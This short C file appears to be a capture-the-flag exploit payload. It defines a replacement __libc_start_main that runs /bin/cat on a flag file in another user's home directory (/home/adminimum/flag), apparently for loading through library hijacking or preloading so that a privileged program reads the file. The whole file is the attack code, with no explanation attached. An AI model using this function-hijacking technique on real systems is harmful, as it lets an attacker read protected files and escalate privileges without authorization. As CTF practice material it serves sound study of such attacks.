#include <stdlib.h>
#include <unistd.h>
void __libc_start_main()
{
	char *arg[] = { "/bin/cat", "/home/adminimum/flag", 0 };
	execve(arg[0],arg,0);
	exit(0);
}